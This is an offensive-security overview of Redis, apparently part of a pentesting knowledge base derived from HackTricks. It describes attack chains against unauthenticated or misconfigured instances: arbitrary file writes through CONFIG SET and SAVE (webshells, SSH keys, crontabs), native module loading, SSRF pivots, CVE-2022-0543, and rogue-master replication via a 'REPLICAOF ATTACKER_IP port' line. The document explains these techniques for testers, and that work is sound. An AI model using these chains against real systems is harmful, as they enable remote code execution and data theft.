---
technology: Redis
kind: overview
audience: offensive-security
layer: in-memory data-structure store (database / cache / queue)
language: C
first-released: 2009
license: "BSD-3 historically; RSALv2/SSPLv1 dual-licensed from 7.4, AGPLv3 option from 8.0"
homepage: "https://redis.io"
github-repo: "redis/redis"
source: "rewritten from HackTricks (network-services-pentesting/6379-pentesting-redis.md), CC BY-NC 4.0, accessed 2026-11-12"
provenance: "hybrid: corpus-grounded (1 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line"
---

# Redis

> A plain-text, no-auth-by-default command channel into a process that can write files anywhere it runs, load native code, and re-point its replication at your server — which is why one open port or one SSRF is often the entire chain.

## What it is

Redis (created by Salvatore Sanfilippo, 2009, written in C) is an in-memory data-structure server: strings, hashes, lists, sets, sorted sets, streams. Deployments use it as a cache, session store, message broker, and sometimes a primary database. Clients speak RESP — a human-readable, line-based protocol — over TCP/6379, optionally wrapped in TLS (TLS is the norm in managed deployments).

The mental model for an operator: one process holds everything in RAM and executes commands one at a time on a single command loop. There is no query language and no schema — just a command dispatcher (`SET`, `GET`, `CONFIG`, `MODULE`, `REPLICAOF`…) whose table the administrator's config can rename, remove, or gate behind ACLs.

The operator takeaway is the default posture: a user named `default` with **no password**. Protected mode (since 3.2) refuses non-loopback clients when no password and no explicit bind address are configured — the mitigation exists, but every step away from it (a `requirepass` never set, `protected-mode no`, `bind 0.0.0.0`) is a finding class on its own. And because RESP is plaintext and error-tolerant, anything that can open a TCP stream or inject CRLFs — most famously SSRF — can drive the server.

## The anatomy that matters on an engagement

    client (redis-cli / app / SSRF pivot)
      → TCP 6379 → RESP parser (line-based, survives garbage input)
      → auth check (requirepass password / Redis 6+ ACL users)
      → command table (rename-command edits live here)
      → single-threaded command loop → data structures in RAM
          ├→ persistence: RDB snapshot / AOF log, written to $dir/$dbfilename
          │    ← CONFIG SET changes both paths at RUNTIME
          ├→ module engine: MODULE LOAD pulls a native .so into the process
          └→ replication: REPLICAOF points this instance at another server
               and makes it ingest whatever that server sends

Three structural properties drive most findings:

- **Persistence is a runtime-configurable file write.** `CONFIG SET dir` + `CONFIG SET dbfilename` + `SAVE` converts data access into an arbitrary-file-write running as the redis user (webshell, `authorized_keys`, crontab). Redis 7+ ships these knobs locked by default (`enable-protected-configs`, `enable-module-command`) — probing whether they were unlocked is the first post-auth move.
- **The protocol eats anything.** Lines it cannot parse get an `-ERR` reply and the connection stays open, so HTTP requests, gopher URLs, and CRLF-injected bodies all speak fluent Redis.
- **One thread serves everyone.** A blocking or expensive command (`MONITOR` left open, `KEYS *` on a huge keyspace, a slow `EVAL`) stalls every client — simultaneously a DoS hazard for your tooling and free telemetry for enumeration.

## Where you'll meet it

- **Session/cache/queue store behind a web app** — the classic position. Keys hold session blobs, password-reset tokens, API keys, PII; reading them is often the report on its own, and app-level trust in cached values (role flags cached in Redis) turns a read into account takeover.
- **SSRF pivot target in cloud estates** — the instance is bound to loopback or a VPC-internal address and looks unreachable, until the app you are testing fetches an internal URL for you. Managed offerings (ElastiCache, Azure Cache for Redis, Memorystore) strip or neuter `CONFIG` and `MODULE`, but the SSRF still reaches the data plane — and Redis 7's `local`-only protection modes are satisfied by a loopback pivot, re-enabling the dangerous primitives exactly when SSRF is your only access.
- **The exposed instance from a port scan** — TCP/6379 answering `+PONG` to anyone. Internet-wide scans have harvested these for years, mostly for cryptomining via the file-write primitive; expect versions 4.x–6.x, no password, protected mode off.

## Why it became the classic SSRF-to-RCE hop

Three capabilities stack, and an SSRF only needs to reach the port. **Config-driven persistence** supplies the file write: drop a webshell into the web root, an SSH key into `authorized_keys`, a line into a crontab. **Module loading** upgrades file placement to code execution — `MODULE LOAD` on a compiled `.so` runs native code inside the server. **Replication tricks** remove even the need for a prior write: `REPLICAOF ATTACKER_IP port` makes the victim pull a malicious payload from a rogue master you control, which is how redis-rogue-server turns Redis 4.x/5.x into a shell. Whichever rung of that ladder the instance's config permits, an SSRF to port 6379 is never just "internal port access".

## Characteristic misconfigurations

- **No `requirepass`, no ACL users** — default user, empty password, `INFO` for anyone who connects.
- **`protected-mode no` + `bind 0.0.0.0`** — the safety net explicitly disarmed and the port offered to every network.
- **`rename-command` theater** — renaming `FLUSHALL` (or `CONFIG`) to `""` or a weak name looks like hardening, is trivially fingerprinted from command-count and error shapes, and never touches the commands that actually grant RCE.
- **Ancient versions (4.x/5.x)** where module-load and rogue-replication chains work with zero additional configuration.
- **Distro packaging mistakes** — Debian/Ubuntu Redis before the Lua-library split (CVE-2022-0543) turned `EVAL` into arbitrary library loading and command execution.

## Reading the server's mind

Five facts that predict how a Redis target behaves on the wire (each expands into a phase of [[redis-bug-bounty]]):

1. **RESP answers before you authenticate.** Pre-auth `INFO` works on unprotected instances; a `-NOAUTH Authentication required.` error is the tell that a password exists and the hunt moves to credentials.
2. **Errors are per-line and connections survive garbage.** A spray of `-ERR unknown command 'Host:'` is the smoking gun that an SSRF endpoint is speaking Redis.
3. **`INFO` is a free system survey.** Version, OS, uptime, replication role, and per-database keyspace counts — it frames every later decision before you touch a key.
4. **Command execution is serialized.** One slow command is every client's slow command: an operational constraint on your own tooling and a cheap denial-of-service finding.
5. **The default user is named `default`.** Password-only auth means username `default`; nothing external distinguishes a password-only setup from an ACL setup until valid credentials actually succeed.

## Where to go next

[[redis-bug-bounty]] — the phased agent methodology: fingerprinting, auth probing, enumeration, the SSRF pivot, the full exploitation ladder with expected outputs and cleanup, cloud context, and tooling.
